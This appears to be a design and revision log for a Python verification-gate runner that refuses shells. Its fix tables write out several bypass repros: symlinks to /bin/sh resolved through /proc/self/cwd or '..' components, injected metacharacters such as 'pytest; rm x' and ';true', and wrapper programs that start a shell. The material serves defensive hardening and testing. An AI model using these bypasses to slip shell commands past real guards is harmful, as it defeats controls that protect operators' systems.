# C9 design: verification gates as data, argv only (revision 3c)

## Revision 3c

QA (`03_boundary-qa_C9.md`, FAIL on one real-process bypass of QA bar (a)) found D1, the fourth path-resolution mismatch of the same class (round 2: a relative symlink; round 3: `/proc/self/cwd`; QA: a `..` after a symlink). Daniel's decision stands (no judge round; QA re-runs). Rev 3c therefore removes the cause instead of the instance, then enumerates the family twice, as a table of real-CLI rows and as a differential fuzz against the kernel, and that search found TWO MORE members of the class (D1b in my own first draft of this revision, D1c in revs 3 and 3b). All three were reproduced before they were fixed (Proofs 14 and 15). Rev 3b below is kept.

| id | what was wrong | fix in rev 3c | proof |
|---|---|---|---|
| D1 (code, blocking; QA) | the safety path called `os.path.normpath` before walking components, so a `..` that FOLLOWS a symlink collapsed lexically and the link was never examined; `realpath` then ran in the runner where `/proc/self/cwd` is the runner's cwd. Repro: `sub/lnk -> /proc/self/cwd`, `mysh -> /bin/sh` in the parent, gate `lnk/../mysh` with cwd `sub`, runner in `D/a/b`: the child ran the shell, no `--allow-shell`. Variants that also bypassed: absolute `D/sub/lnk/../mysh`, `./lnk/../mysh`, `lnk -> /proc/thread-self/cwd`, a PATH entry `lnk/..`, the string form | the root cause is removed, not the instance: (1) an executable word, or a PATH entry the search reaches, with a `..` component is refused, checked on the RAW string before any normalisation (`_no_dotdot`); (2) every `normpath` and `realpath` in the safety path is gone: ONE function, `_walk`, resolves the path one component at a time, physically, like the kernel (a link's target is pushed back onto the work list; an absolute target restarts at `/`; a relative one starts from the link's own folder), refuses any component under `/proc` or `/dev` before looking at it, and returns the resolved path; more than 40 links is refused; (3) an `OSError` while resolving is now a refusal (it used to be ignored: fail open) | Proof 14 (rev 3b: rows r08-r13 bypass); `test_the_d1_repro_exactly_as_qa_reported_it`; N46, N47 |
| D1b (code; found by probing my own first rev-3c draft; same class) | in that draft `_walk` joined a `..` that came from a link's TARGET lexically (`cur/..`) instead of applying it to the folder reached, so the next component was tested as `.../../proc` and never matched `/proc`. `sub/lnk -> ../../…(30 times)…/proc/self/cwd/mysh`, `sub/up -> ../…` (up to `/`) then `up/proc/self/cwd/mysh`, and `sub/m2 -> lnk/../mysh` (D1 inside a link target) ran the shell when the runner was in another folder | a `..` from a target is applied to the folder reached so far (`os.path.dirname(cur)`: that folder holds no link and no `..`, so its parent is exact, and `/` stays `/`) | rows r36-r39 (the draft: r36, r37, r38 bypass); `test_a_dotdot_inside_a_link_target_is_applied_to_the_folder_reached_so_far`, `test_a_harmless_dotdot_inside_a_link_target_is_followed_not_refused`; mutants W17-W20 |
| D1c (code; fifth class; present in revs 3 and 3b too) | a PATH hit that is itself a link into `/proc`: `isfile(candidate)` followed the link in the RUNNER's `/proc/self/cwd` (no such file there, so "not a file": the search went on and ended with no hit or a harmless one) while the child's exec follows it in ITS cwd and runs the shell: PATH `d1`, `d1/tool -> /proc/self/cwd/mysh`. The 3b test `test_a_path_hit_that_is_a_link_into_proc_is_refused` passed by luck: it put a harmless `mysh` in the runner's folder | the candidate is walked BEFORE the file test (a link into `/proc` or `/dev` is refused there), and the walked path is what is tested and returned | rows r48, r49 (rev 3b: bypass); `test_a_path_hit_that_is_a_link_into_proc_is_refused_when_the_runner_lacks_the_target`; mutants T05, T05b |
| cost | an executable word with `..` is refused (`../tool`, `a/../b`, `/usr/../bin/x`); a PATH entry with `..` that the search reaches is refused; a gate whose cwd is under `/dev` (such as `/dev/shm/x`) is refused for a bare name | stated and pinned: arguments, `python -c` bodies, wrapper arguments and declared shell gates keep their `..`; only the executable word and the PATH entries up to the first hit are looked at | `test_any_dotdot_component_in_the_executable_...` (7), `test_arguments_and_python_bodies_and_declared_shell_gates_keep_their_dotdot`, `test_dotdot_is_refused_in_a_path_entry_that_the_search_reaches_...` |
| systematic closure | whack-a-mole | `tests/gate_matrix.py` holds 64 rows once (58 refused, 6 documented limits); `tests/test_gates.py` runs them through the real CLI (runner cwd != gate cwd for every refused row, plus runner cwd == gate cwd and `--root` elsewhere for 22 core rows), and `02_strategy-architect_C9_probe_matrix.py` runs every row in all three placements, with `strace -f -e trace=execve` counting the gate's own exec calls. A seeded differential fuzz (`test_differential_fuzz_the_kernel_resolution_versus_the_plan`, 3 seeds in the suite; `02_strategy-architect_C9_fuzz.py`, 480,000 words) compares the kernel's own resolution (this process with its cwd set to the gate's) against the plan with the runner elsewhere. Result: rev 3b {REFUSED: 49, LIMIT: 6, BYPASS: 9, ANOMALY: 0}; rev 3c {REFUSED: 58, LIMIT: 6, BYPASS: 0, ANOMALY: 0}; the fuzz finds violations on rev 3b and on the first rev-3c draft and none on the shipped tree | Proofs 14 and 15, N48, N50 |
| Q25 (QA survivor) | `startswith(root)` without the slash would over-refuse `/developer/tool` | intended behaviour decided and pinned: `/dev`, `/proc` and anything below are refused, siblings (`/developer`, `/devices`, `/procfs`, `/process`, `/devx`) are NOT | `test_the_root_names_are_matched_whole_so_a_sibling_folder_is_not_inside_them`; mutant V25 |
| Q26 (QA survivor) | the `//proc` lexical form had no test | the normalisation the mutant touched no longer exists; `//proc/self/cwd/x`, `//dev/null`, `/dev//null`, `/./dev/null` are pinned in-process, and r19-r21, r58, r59 (`/proc//self`, `//proc`, `/./proc`, `//dev/null`, `//proc/1/cwd/x`) go through the real CLI | same test; matrix rows; mutants W21, W22 |
| Q42 (QA survivor) | the metacharacter scan could skip the first character | `;true`, `&x`, `|x`, backtick, `$HOME/x`, `<x`, `>x` as the FIRST character are each refused (a leading newline or CR is outer whitespace and is stripped, so it is not a first character) | `test_a_metacharacter_as_the_first_character_is_refused_too` (7) |
| Q90 | equivalent | none | |

Not built (unchanged): extend `SHELL_RUNNERS` and the shell-name list; skip a signal whose disposition is `SIG_IGN`; a PATH search that mirrors `exec` for files it skips; scrub `LD_PRELOAD` locally; `PR_SET_PDEATHSIG`; detecting copies, hard links and links made by earlier gates.

Known unverified, and not closed (each is also in Does not cover): Windows and macOS (POSIX-only module, no run there); a GitHub CI run on 3.12 (local runs only); SIGKILL of the runner orphans a running gate; wrappers, interpreters and scripts are not detected (`python -c`, `perl -e`, `awk`, `node -e`, `make`, any script, wrappers not on the list, chains); `LD_PRELOAD`, `BASH_ENV`, `ENV`, `PYTHONSTARTUP` and `PYTHONHOME` pass through the env scrub (it works on names); a copy or a hard link of a shell (rows l01, l02 run the marker); a link made by an earlier gate of the same file; the TOCTOU between plan and spawn; a bind mount of `/proc` somewhere else or a case-insensitive volume. Still a speed bump that catches common accidents and the string form turning into a shell, NOT a sandbox: the matrix and the fuzz are evidence about what they cover, they cannot prove that a sixth mismatch does not exist, and this revision found two more after the one QA reported.

---

# Revision 3b text (kept)

## Revision 3b

Judge round 3 (`02_adversarial-risk-judge_C9_r3.md`: UPHELD 69 / REJECTED 5, two defects: ATK5, and ATK6 counted on N42). Daniel decided there is no round 4 (`00_input/request.md`, "C9 decision"): the two defects are closed, the three disclosed limits are stated and (where possible) pinned, and nothing else changes. Revision 3 below is kept as it was. Both failures were reproduced first on the rev-3 tree (Proof 13).

| id | what was wrong | fix in rev 3b | proof |
|---|---|---|---|
| ATK5 (code) | `ln -s /bin/sh sub/mysh`; `{"argv":["/proc/self/cwd/mysh","-c","echo A; echo B > out.txt && echo $0"],"cwd":"sub"}`, runner in the parent folder, ran a shell without `shell: true` (status pass, `sub/out.txt` created; also `/proc/thread-self/cwd/mysh`, `/proc/self/cwd/./mysh`, a PATH entry `/proc/self/cwd`). Cause: `_resolve` ran `realpath` in the RUNNER, where `/proc/self` is the runner's, while the child chdirs to the gate cwd and opens its own `/proc/self/cwd`. N37 ("absolute path") and N41 ("never from the runner's") were false for these | Decision: any executable under `/proc` or `/dev` is refused outright (policy error, nothing spawned, exit 2, text without the word). The rule, applied to `argv[0]` of non-shell gates (and to every PATH entry and PATH hit the search meets) BEFORE and AFTER the resolution: (1) the lexical path, joined onto the gate cwd and normalised (`//proc`, `/./proc`, `/proc/../proc`, `../../proc` all collapse), starts with `/proc` or `/dev` (the roots themselves included); (2) a symlink met on any component, read with `readlink` and followed WITHOUT realpath, leads into `/proc` or `/dev` (a file link, a directory link, a chain, `d -> /` then `d/proc/...`; a loop or more than 40 hops is refused); (3) the final `realpath` is under `/proc` or `/dev` (`d -> /dev`, `d/../dev/null`). Cost: nothing legitimate executes from either; `/dev/shm/tool` IS refused (documented false positive); only the executable word is looked at, so arguments, `python -c` bodies, wrapper arguments and declared shell gates are NOT affected (pinned by test) | Proof 13; 38 new cases (34 fail on rev 3, counting the parametrised ones); mutants V01-V18; N37 and N41 changed, N43 added |
| ATK6 (proof gap) | the judge's mutant K08 (the PATH search takes the LAST hit instead of the first) survived all 505 tests and is a real false pass (`d1/mytool -> shell`, `d2/mytool` harmless: the mutated plan accepts, the child runs d1's) | the judge's kill test: `test_the_first_path_hit_wins_not_the_last` (PATH `d1:d2`, the other order accepted). Host independent: the "shell" is an executable file named `bash` written by the test, not a link to the host's `sh` | K08 now dies (Proof 11c); N42 changed, N44 added |
| doc 3a-1 | the shebang limit was stated only in the Revision 3 paragraph, whose heading said "stated and pinned" | wrong heading fixed; the limit is now in the module docstring, Does not cover and N45, and pinned by `test_the_stated_limit_an_earlier_path_file_that_exec_skips_is_accepted` (no shebang, missing interpreter): the plan ACCEPTS, the child runs the shell | docstring, Does not cover, N45 |
| doc 3a-2 | shell-list gap | stated: the 14 names do not include `ksh93`, `elvish`, `nu`, `xonsh` or versioned names (`bash5.2`, `zsh-5.9`); not widened | docstring, Does not cover, N45 |
| doc 3a-3 | host dependence | stated: older tests link to the host's `sh` and would fail on a host where `sh` is a busybox applet (Alpine UNVERIFIED); the rev-3b tests use a test-made `bash` file and do not | Does not cover |
| doc 3b | claims wider than what is proven | N37, N41, Design 4b R2, the module docstring and the CLI help now say exactly: symlinks reached by an absolute path, a cwd-relative path or PATH, with `/proc` and `/dev` refused outright. Decision 3 says plainly: a speed bump that catches common accidents and the string form turning into a shell, NOT a sandbox; each audit round found a new path-resolution mismatch of the same class (a relative symlink in round 2, `/proc/self/cwd` in round 3) and others may exist | Decision 3, docstring, CLI help |

Not built (Follow-ups, unchanged by this revision): extend `SHELL_RUNNERS` and the shell-name list; skip a signal whose disposition is `SIG_IGN`; a PATH search that mirrors `exec` for files it skips; scrubbing `LD_PRELOAD` locally; `PR_SET_PDEATHSIG`; detecting copies, hard links and links made by earlier gates.

---

# Revision 3 text (kept)

## Revision 3

Judge round 2 (`02_adversarial-risk-judge_C9_r2.md`: UPHELD 68 / REJECTED 2, one defect counted on N37 and ATK4). Round 3 is the last round: the blocker is closed, nothing else is added, and rev 2 below is kept as it was except the two "444" typos. Every failure was reproduced first on the rev-2 tree (Proof 12).

| id | what was wrong | fix in rev 3 | proof |
|---|---|---|---|
| ATK4 (code) | `_shell_refusal` resolved a RELATIVE `argv[0]` against the runner's cwd, but the child starts in the gate's cwd. With `ln -s /bin/sh sub/mysh`, `{"argv":["./mysh","-c","echo A; echo B > out.txt && echo $0"],"cwd":"sub"}` ran a shell (status pass, `sub/out.txt` created); the second variant (runner in `other/`, `--root ../sub`, default cwd) did too. Absolute paths and bare names were caught, so N37's "symlinks of any name" and Design 4b R2 were false | the cwd is now fenced BEFORE the shell check, and `_resolve(word, cwd)` resolves from it: a word with a `/` is `realpath(join(cwd, word))`; a bare name is searched along PATH the way `Popen` does (`os.get_exec_path()`, first entry holding an executable regular file; an empty or relative entry means the gate's cwd, which is what the forked child's `exec` does after its `chdir`). `shutil.which` is gone (it resolved against the runner's cwd too) | Proof 12: both repros exit 2 with nothing spawned and no `out.txt`/`out2.txt`; 16 new cases (10 of them fail on rev 2); mutants T01-T12 (T04 survived the first run, a directory of the same name on PATH, and got its own test); N37 changed, N41 and N42 added |
| doc (a) | programs that run a shell without naming one | stated: `flock -c`, `script -qec`, `runuser -c`, `parallel 'a;b'`, `sudo -s` and `env -S 'sh -c id'` are NOT detected (`flock` and `script` ran for real in the judge's probe) | Decision 3, module docstring, Does not cover |
| doc (b) | not stated: a copy, hard link or renamed shell, a symlink to a wrapper, a link made by an EARLIER gate | stated, and pinned by `test_the_stated_residual_limits_of_the_shell_refusal_are_pinned`. The ATK4 fix does NOT change the earlier-gate answer: every gate is still validated before any runs, so a link that the same file's gate 1 creates does not exist yet when gate 2 is checked and gate 2 is accepted; a link that already exists (made by a previous run) is now caught from any cwd | Decision 3, Does not cover |
| doc (c) | unlisted false positives | `timeout 5 pytest tests/shell/sh`, `find . -path "*/bash"`, `time pytest -k sh` are refused (any wrapper argument whose last path component is a shell name); pinned by `test_the_documented_wrapper_false_positives_are_refused` | Design 4b |
| doc (d) | signal race | Decision 9: a SystemExit raised between `Popen` and the `try` in `stream_process` (thread creation, sub-millisecond) skips the `finally` and orphans the gate | Decision 9 |
| doc (e) | SIGHUP under nohup | Decision 9 and Does not cover: a runner started with SIGHUP ignored (nohup) now dies with rc 129 and no report, because the new handler overrides the ignore (rev 1 ignored it; an ignored SIGINT is honoured). Code unchanged; "skip a signal whose disposition is SIG_IGN" is a follow-up | Decision 9, Follow-ups |
| doc (f) | stale and weak text | the two "444 passed" are now 489 (Revision 2 table); PYTHONPATH listed once in Does not cover; the reason for not scrubbing `LD_PRELOAD`, `BASH_ENV`, `ENV`, `PYTHONSTARTUP`, `PYTHONHOME` is restated (operator-owned environment, open-ended list; a local drop in `gates.py` is possible and left as a follow-up) | Does not cover |

Follow-ups (not built): extend `SHELL_RUNNERS` with `runuser`, and with the `-c` forms of `flock` and `script`, and `parallel`, `sudo -s/-i`, `env -S`; skip a signal whose current disposition is `SIG_IGN`; move the `try` in `stream_process` to cover `Popen`'s successors; scrub `LD_PRELOAD` and friends locally in `gates.py`; refusing a PATH with relative entries; `PR_SET_PDEATHSIG`; detecting copies, hard links and links made by earlier gates (needs a post-run recheck). Not widened: the shell-name and wrapper lists are unchanged (pinned by `test_shell_names_and_wrappers_are_the_documented_lists`).

Rev 3 residual limit of the fix, stated (rev 3b: pinned by a test, and in the docstring and Does not cover): the PATH search takes the first executable regular file on the PATH as `exec` would; where `exec` would skip an entry that fails to execute for another reason (a bad interpreter line, a permission it does not report at plan time) the check may look at a file `exec` skips, and a file that appears or changes after validation (an earlier gate) is not seen.

---

# Revision 2 text (kept)

## Revision 2

Judge round 1 (`02_adversarial-risk-judge_C9_r1.md`: UPHELD 62 / REJECTED 3, no A or N row rejected on its text; the three rejections were the judge's attack rows). Each fix, against its id. Every failure was reproduced first on the rev-1 tree (outputs in Proof 10).

| id | what was wrong | fix in rev 2 | proof |
|---|---|---|---|
| ATK1 | `{"argv":["sh","-c","echo A; echo B > out.txt && echo $0"]}` and `"command":"bash -c ls"` ran a shell without `shell: true` and without `--allow-shell`, so Decision 3's sentence "editing the file alone cannot switch a shell on" and the title's "no shell" were false; `env sh`, `busybox sh`, `xargs ... sh -c`, `find -exec sh`, `su -c` were accepted too | (a) code: `_shell_refusal`, non-shell gates only: the executable is refused when its basename (lower case, `.exe` stripped), or the basename of what a path or a PATH lookup resolves to, is one of 14 shell names; `su` and `watch` are refused outright; 29 one-hop wrappers are refused when ANY later argument has a shell basename. (b) text: Decision 3, Design 4, 6, the module docstring, the CLI help, the title and the backlog-bar mapping now state what is and is not controlled (Decision 3, Design 4b, Does not cover) | Design 4b; tests `test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate` (41), `test_every_listed_*` (14 + 29 + 2), `test_ordinary_programs_are_not_mistaken_for_shells` (14), symlink / named-sh / CLI / declared-shell tests; mutants H01-H6 (see the table) |
| ATK2 | `test_a_signal_to_the_runner...[SIGINT]` left the runner child's SIGINT disposition inherited: ignored under `trap '' INT` or nohup, the child never raised `KeyboardInterrupt` and the test timed out | the runner child is started through a boot line that restores Python's own handler (`signal.default_int_handler`: `SIG_DFL` would kill the runner without unwinding, which I tried first and caught) before `runpy`-ing the module; thread-safe, unlike `preexec_fn`; stdin is `DEVNULL`; runs for SIGINT, SIGTERM and SIGHUP | Proof 10: the rev-1 failure reproduced, then 489 passed under `trap '' INT`, `trap '' INT HUP`, `setsid nohup`, closed stdin, on 3.11/3.12/3.13 |
| ATK3 | `test_missing_executable_is_an_error_not_a_pass` failed as user `nobody` (a PATH with root-only directories makes `execvp` report EACCES before ENOENT) | the test pins `PATH` to a folder every user can search (`monkeypatch.setenv`); the code was right (status `error` either way) | Proof 10: reproduced 365 passed / 1 failed as `nobody`; now 489 passed as `nobody` with the repo PATH, with a sane PATH, as root, under `env -i` |
| F1 | Decision 9 said a signal kills the running gate; SIGHUP left it running (rc 129) | SIGHUP is handled exactly like SIGTERM (`HANDLED_SIGNALS`, exit 129); wording now: SIGTERM, SIGHUP and SIGINT only; SIGKILL of the runner orphans a gate | tests parametrised over the three signals; mutants G01-G14 |
| F2 | `_sigterm_raises` restored `previous` unconditionally; `signal.signal` returns None for a handler installed from C | restore falls back to `SIG_DFL` (`_signals_raise`) | `test_a_handler_installed_from_c_is_restored_to_the_default`; mutants G13, G14 |
| F3 | effort label S | M: 561 lines of module + 4 + 2492 lines of tests + 573 of matrix, 51 N rows and 427 mutants, a command-spawning component with a signal handler; proportionate | header |
| F4 | `LD_PRELOAD`, `BASH_ENV`, `PYTHONSTARTUP`, `ENV`, `PYTHONHOME` pass through the env scrub | named in Does not cover. Not scrubbed (reason restated in rev 3): they are the operator's own environment and the gate runs as the operator, and a name list is never complete once wrappers exist; `gates.py` could drop them locally in one tuple, which is left as a follow-up | Does not cover |
| F5 | the false-positive heading said "accepted" for inputs that are refused | reworded: "refused although harmless" | Design 3 |
| F6 | N25-N27 grep would match "feed" | tightened to a word-boundary pattern | N25 |
| F7 | A7 cites :158 and :194 only; A23 says "bounded at three" | A7 also cites :165; A23 says "defaults to three (policy-configurable)" | Authority List |

Not built, with reasons (Follow-ups): closing wrapper chains (not closable by a tripwire); scrubbing `LD_PRELOAD` and friends (F4); `PR_SET_PDEATHSIG` for SIGKILL of the runner (Linux-only, would not cover grandchildren); a CLI flag for the total time budget.


Item: C9 (Pick 10). Shape: runtime module, effort M (one new module of 561 lines, one added keyword in an existing module, one test file). Code is delivered as `_workspace/02_strategy-architect_C9.patch` (sha256 `56290e7a7600f5ea018fa2395e2233cbc0d9f095643945e5fb0bdc2304f1bb3e`, 3669 lines, the whole slice, applies with `git apply` on `588dd9b` (origin/main before C9); four files: new `src/master_finhub/evals/gates.py`, new `tests/test_gates.py`, new `tests/gate_matrix.py`, and `src/master_finhub/sandbox/stream.py` +4/-0) and, for the tree as it stands now (HEAD `5baf9f7` holds rev 3b), `_workspace/02_strategy-architect_C9_3b_to_3c.patch` (sha256 `e8ef627e55f8a575a8fe5c76e384861ab087e3f85da43df737b61ad0088fecac`, 1081 lines: gates.py, test_gates.py, new gate_matrix.py; `stream.py` is already in HEAD). `src/master_finhub/evals/runner.py` is NOT in the patch: the C4 exit-code contract 0/1/2/3 and `--baseline` cannot change because the file is byte-identical (sha256 `c34f998b...e06166e6` before and after).

## Decisions Daniel should know

1. **Separate CLI, not a flag on the runner.** `python -m master_finhub.evals.gates <gates.json>`. The C4 runner takes one or more benchmark paths as a required positional (`runner.py:284`, pinned by `test_no_benchmark_paths_exit_2`); a `--gates` flag would have to make that optional and would add a third report shape to a contract that three audits and a QA bar already froze.
2. **JSON, not YAML.** `pyproject.toml:10` declares `dependencies = []`; the reference reads YAML with PyYAML (`service.py:19`, `:2002-2012`). A new dependency for a gate list is not worth it.
3. **What is and is not controlled about shells (rewritten in rev 2).** (a) This module starts `/bin/sh -c` only for a gate that declares `"shell": true` AND is run with `--allow-shell` (the reference honours the declaration alone, `service.py:160-161`); the string form never turns into a shell by itself. (b) In a non-shell gate a shell as the executable (`sh`, `bash`, `dash`, ... by name, or by what the path or the PATH lookup resolves to), `su`, `watch`, and a one-hop wrapper (`env`, `xargs`, `busybox`, `find -exec`, ...) handed a shell are refused with a policy error. (c) NOT detected: wrappers not on the list, wrapper chains, interpreters (`python -c`, `perl -e`, `awk system()`, `node -e`), `make`, scripts, a copy, hard link or renamed shell, a symlink to a wrapper, a link created by an EARLIER gate of the same file (all gates are validated before any runs), and any program that itself starts a shell, including ones that run one without naming it: `flock -c`, `script -qec`, `runuser -c`, `parallel 'a;b'`, `sudo -s`, `env -S 'sh -c id'` (`flock` and `script` ran for real in the judge's probe). (d) Rev 3c: an executable word, or an examined PATH entry, with a `..` component is refused outright (checked on the raw text), and the path is resolved by one physical walk with no normalisation. So the two keys are a declaration convention that stops an accidental shell, and the refusal in (b) is a speed bump that catches common accidents and the string form turning into a shell; neither is a sandbox, and a gate file you do not trust must not be run. Each audit round found a new path-resolution mismatch of the same class (a relative symlink in round 2, `/proc/self/cwd` in round 3, a `..` after a symlink in QA, then in rev 3c a `..` inside a link target and a PATH hit that is a link into `/proc`), so others may exist. What the refusal claims, exactly: symlinks reached by an absolute path, a cwd-relative path or PATH, with `/proc` and `/dev` refused outright. Not detected either: an executable earlier on PATH that exec skips (no shebang, a missing interpreter) before a same-name shell link, and shells outside the 14 listed names (`ksh93`, `elvish`, `nu`, `xonsh`, versioned names). The second key is out of band, so editing the file alone cannot switch on `shell: true`, but editing the file can still run `python -c "import os; os.system(...)"`. Drop the flag requirement if you disagree: it is one `if` (mutants Q05, Q06, F02, F03, F34, M01, M02).
4. **Every gate is checked before anything is spawned.** One refused gate means NO gate runs (the reference runs the others, `service.py:2096-2106`). Exit 2, per-gate report, `not-run` for the rest.
5. **The command guard and the credential-path denylist apply to gate argv** (`guard_tool_call`, the same function the agent loop uses), including the gate's cwd. A gate that would run `git push --force` or touch `~/.ssh` is a policy error, not a run. It is a tripwire, not a sandbox: gates are trusted operator data.
6. **A list form `"argv": [...]` is added next to the reference's string form.** The string form keeps the reference's conservative rule (a `;` inside quotes is refused), which would otherwise make every `python -c "a; b"` gate impossible without a shell. The list form is passed verbatim and needs no rule.
7. **Exit codes: 0 all passed, 1 a gate failed/timed out/could not start/was not run, 2 the file is unusable or a gate was refused (nothing spawned).** There is no 3: that code means "regression against a baseline" in C4 and gates have no baseline.
8. **The only existing source file touched is `sandbox/stream.py`**: `stream_process` gains `cwd: str | None = None` and passes it to `Popen`. Everything else (env scrub, closed stdin, new session, process-group kill, tail buffer) was already there and is reused as it is.
9. **SIGTERM, SIGHUP and SIGINT sent to the runner kill the running gate's process group; SIGKILL of the runner (and anything the kernel kills without a handler) orphans a running gate.** Found by probing: SIGTERM (a CI cancel) terminated the runner and left a 60 s gate child running; SIGINT already cleaned up through `stream_process`'s `finally`; the judge found SIGHUP (rc 129) did the same as SIGTERM had. `main` installs handlers for SIGTERM and SIGHUP for the run that raise `SystemExit(128 + signal)` (143, 129), restores the previous handlers afterwards (SIG_DFL when it was installed from C), and leaves them alone off the main thread (about 20 lines). Limits (rev 3): a SystemExit raised between `Popen` and the `try` in `stream_process` (thread creation, a sub-millisecond window; SIGINT had it in rev 1) skips the `finally` and orphans the gate; a runner started with SIGHUP ignored (nohup) now dies with rc 129 and no report, because the handler overrides the ignore (rev 1 ignored it; an ignored SIGINT is honoured), and "skip a signal whose disposition is SIG_IGN" is a follow-up; a signal after the last gate or while the report is written finds the handlers restored and kills the runner by signal.
10. **UNVERIFIED**: Windows (the module cannot even be imported there: `tools/sensitive_paths.py:4-7` fails loudly) and macOS (same POSIX code path, no test run on it); GitHub CI on 3.12 (only run locally here); a gate whose command is a wrapper that re-parents its work out of the process group.

## Source

Backlog row C9 (`_workspace/01b_capability-scout_backlog.md:56`): "Verification gates as data: argv only, no shell; shell metacharacters are an error unless `shell: true`", sources OH28, OH81, OH29, target `evals/gates.py` + CLI, MIT adapt, score 0.80. Backlog proof: `pytest tests/test_gates.py`, `"pytest -q"` runs as argv, `"pytest; rm x"` is a policy error that fails the step without spawning (spawn spy), `shell: true` honoured only when declared, a gate that times out reports FAIL not PASS. Re-opened:

- **OH28** (`01_reference-miner_openharness_portmap.md:63`) -> `references/openharness/src/openharness/autopilot/service.py`. Opened: metachar set `:136`; `_VerificationCommand` docstring `:140-147`; `_parse_verification_entry` `:155-196` (mapping/str/other `:156-173`, `bool(entry.get("shell", False))` `:160`, scan on the raw text `:175-184`, `shlex.split` `:185-193`, empty argv `:194-195`); `_looks_available` `:199-210` and its use `:2086-2092`; the run `:2094-2155` (policy error -> error step, `continue` `:2097-2106`; `subprocess.run(list, shell=cmd.shell, timeout=1800)` `:2107-2117`; success/failed `:2122`; `[-4000:]` `:2123-2124`; `FileNotFoundError` `:2127-2135`; `TimeoutExpired` `:2136-2145`); the empty-report text `:2169`; default policy `:90-107`.
- **Tests** `references/openharness/tests/test_autopilot/test_verification.py:19-82` (argv, quoting, eight metachar payloads, shell opt-in, mapping without shell, `shell: False` still rejected `:70-73`, empty `:76-79`, non-string entry `:82-85`), plus `:88-91` (unclosed quote), `:111-130` (spawn must not be called for a refused entry), `:133-192` (argv with `shell` False, explicit shell), `:195-211` (missing executable is an error step), `:214-221` (a metachar inside quotes is still refused, on purpose), `:223-235` (real subprocess end to end).
- **OH81** (`portmap:151`) `load_policies` `:492-500`, `_read_yaml` `:2002-2012` (falls back to defaults on any failure: pattern only, deliberately NOT adopted, see Design 2).
- **OH29** (`portmap:64`) `_prepare_repair_prompt` `:1595-1625`, attempts bounded at 3 (`:70`, `:1208-1213`): the consumer of a gate failure, not part of this item (see Does not cover).
- Own code re-read: `src/master_finhub/evals/runner.py` (all 326 lines), `evals/verifiers.py`, `sandbox/workspace.py`, `sandbox/stream.py`, `tools/safety.py` (`check_command`, `_guard`, `guard_tool_call`, `make_guard`), `tools/sensitive_paths.py`, `tools/secret_scan.py`, `tests/test_evals_baseline.py`, `tests/test_stream.py`; the C8 design (format, Authority List) and its mutation runner (adapted here), and the headers of the C3, C4 and C8 judge verdicts for what a judge probes (real-process matrices incl. `/dev/full`, `>&-`, `-W error`, `-X dev`, `PYTHONIOENCODING=ascii`, CPython 3.12/3.13, mutants by class); the full verdict bodies were not re-read.

What the references do NOT do, and this design does (each is a Design item): refuse an empty list (the reference reports "No verification commands were applicable", `:2169`), keep every gate (the reference silently drops commands that "look unavailable", `:2090-2091`), refuse a string `"false"` as the shell flag (`bool("false")` is True, `:160`), scrub the env, close stdin, kill the process group, bound the total time, redact the output, and fence cwd.

## Target

Runtime module (backlog: `evals/gates.py` + CLI). Files:

| file | change | lines |
|---|---|---|
| `src/master_finhub/evals/gates.py` | NEW: loader, policy, spawn, report, CLI `main` | 561 |
| `src/master_finhub/sandbox/stream.py` | `stream_process(..., cwd: str | None = None)`; `cwd=cwd` to `Popen`; one docstring sentence | +4 |
| `tests/test_gates.py` | NEW: 172 tests (parametrised cases counted: 677 with the matrix) | 2492 |
| `tests/gate_matrix.py` | NEW (rev 3c): the resolution-mismatch matrix, 64 rows as data plus the real-CLI runner (also used by the probe script) | 573 |

Not touched (byte-identical, proven by `git apply --stat`): `evals/runner.py`, `evals/verifiers.py`, `evals/__init__.py`, `sandbox/workspace.py`, `tools/safety.py`, `tools/sensitive_paths.py`, `tools/secret_scan.py`, every existing test. New dependencies: none (stdlib only).

## Design

### 1. Entry point and exit codes (decision: separate module)

`python -m master_finhub.evals.gates GATE_FILE [--root DIR] [--allow-shell]`. `--root` is the workspace fence for gate cwd (default: the current folder). The C4 contract stays as it is (`runner.py:305-313`: 0 clean, 1 a case failed, 3 regressed/removed, 2 unusable input, never 0/1/3 when a baseline or the report is lost). Gates use the same meaning of 2 and 1:

| exit | meaning | stdout |
|---|---|---|
| 0 | the list is non-empty and every gate passed | JSON report |
| 1 | at least one gate ended `fail`, `timeout`, `error` or `not-run` (time budget); all gates were checked first and all that could run did | JSON report |
| 2 | the gate file is unusable (any `GateFileError`), the root is unusable, or at least one gate was refused by the policy: NOTHING was spawned; also an unexpected internal error and a lost report | a one-line message, or the JSON report for refused gates |
| (argparse) 2 | usage error: no file, two files, an unknown flag such as `--baseline` | usage text on stderr |
| 143 / 129 / SIGINT death (-2 or 130) | the runner itself got SIGTERM / SIGHUP / SIGINT: no report, the running gate's process group is killed, never 0/1/2 | none |

A lost report (stdout closed, `ENOSPC`, broken pipe, `None`) is 2 for every outcome, including a clean run and a failing run, using the runner's own `_stdout_lost()` (`runner.py:263-269`) so a failed interpreter-exit flush cannot turn it into 120. Contrast with the runner, which keeps its pre-C4 behaviour without `--baseline` (`test_lost_report_without_baseline_unchanged`): gates are new, so the stricter rule costs nothing. A report that could not be delivered is not a pass.

### 2. The gate file: format, schema, strictness

JSON, UTF-8, at most 262,144 bytes. The reference's YAML is not used (no dependency) and its fallback is the opposite of what a gate list needs: `_read_yaml` returns the DEFAULT policy when the file is missing, unreadable or not a mapping (`:2002-2010`); here every such case is exit 2.

```json
{"schema_version": 1,
 "gates": [
   {"id": "unit", "command": "python -m pytest -q", "timeout_s": 300, "cwd": "."},
   {"id": "lint", "argv": ["ruff", "check", "src", "tests"]},
   {"id": "web",  "command": "cd web && make check", "shell": true}
 ]}
```

| rule | error (all exit 2, message starts `Gate file:`; the message never echoes file content) |
|---|---|
| path is not a regular file (missing, directory, FIFO, device; symlink to a regular file is accepted) | `not a regular file` (checked with `os.path.isfile` BEFORE opening, so a FIFO cannot block) |
| read error | `cannot be read` |
| larger than 262,144 bytes | `larger than 262144 bytes` (the read is `read(MAX+1)`: a 5 MB file is never parsed) |
| not UTF-8 (a BOM counts), not JSON, duplicate key at any level, nesting deep enough to raise `RecursionError`, an int with more than 4,300 digits | `not UTF-8 JSON (...)` (`object_pairs_hook` rejects duplicates, as `load_baseline` does at `runner.py:203-207`) |
| root not an object, or a key other than `schema_version`/`gates` | `the root must be an object with only schema_version and gates` |
| `schema_version` missing, not the int 1 (`True` and `1.0` are refused: `type(v) is not int`) | `schema_version must be 1` |
| `gates` missing, not a list, or EMPTY | `"gates" must be a non-empty list` (an empty list is an error so gates cannot be quietly skipped) |
